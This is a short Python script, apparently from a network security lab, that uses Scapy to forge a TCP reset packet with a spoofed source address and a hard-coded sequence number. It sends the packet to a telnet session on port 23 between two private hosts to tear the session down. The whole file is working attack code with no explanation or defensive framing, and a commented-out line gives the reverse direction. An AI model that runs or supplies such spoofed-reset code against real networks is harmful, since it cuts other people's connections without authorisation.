#!/usr/bin/python3
import sys
import os
os.sys.path.append('/usr/local/bin/')
from scapy.all import *

print("SENDING RESET PACKET.........")
#IPLayer = IP(src="192.168.1.40", dst="192.168.1.66")
#TCPLayer = TCP(sport=45910, dport=23,flags="R", seq=1493270842)
IPLayer = IP(src="192.168.1.66", dst="192.168.1.40")
TCPLayer = TCP(sport=45910, dport=23,flags="R", seq=1493270842)
pkt = IPLayer/TCPLayer
ls(pkt)
send(pkt, verbose=0)

